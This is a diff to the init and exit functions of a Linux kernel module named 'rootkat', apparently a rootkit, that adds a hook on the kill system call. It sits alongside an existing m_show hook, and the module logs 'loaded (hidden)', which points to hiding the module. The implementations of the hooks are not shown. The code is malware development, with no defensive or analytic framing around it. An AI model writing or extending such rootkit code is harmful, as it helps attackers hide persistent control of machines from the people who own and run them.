@@ -5,6 +5,7 @@
 #include "kallsyms.h"
 #include "resolver.h"
 #include "hook_m_show.h"
+#include "hook_sys_kill.h"
 
 #define ROOTKAT_TAG "rootkat: "
 
@@ -26,12 +27,20 @@ static int __init rootkat_init(void)
 		return rc;
 	}
 
+	rc = rootkat_hook_sys_kill_install();
+	if (rc) {
+		pr_err(ROOTKAT_TAG "sys_kill hook failed: %d\n", rc);
+		rootkat_hook_m_show_remove();
+		return rc;
+	}
+
 	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
 	return 0;
 }
 
 static void __exit rootkat_exit(void)
 {
+	rootkat_hook_sys_kill_remove();
 	rootkat_hook_m_show_remove();
 	pr_info(ROOTKAT_TAG "unloaded\n");
 }
